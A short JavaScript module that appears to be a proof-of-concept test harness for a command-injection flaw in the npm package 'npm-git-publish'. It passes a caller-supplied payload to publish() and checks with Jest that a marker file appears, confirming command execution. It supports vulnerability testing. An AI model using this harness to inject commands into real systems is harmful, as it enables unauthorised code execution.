function exploitFunction(payload) {
  const git = require("npm-git-publish");
  const fs = require("fs");

  const path = "./npm-git-publish";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }

  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  return git
    .publish(".", payload)
    .catch(() => {
      file_exist = fs.existsSync(path);
      expect(file_exist).toBe(true);
      fs.rmSync("./gihub.com", {
        recursive: true,
        force: true,
      });
      fs.unlink(path, function (err) {});
    });
}

module.exports = { exploitFunction };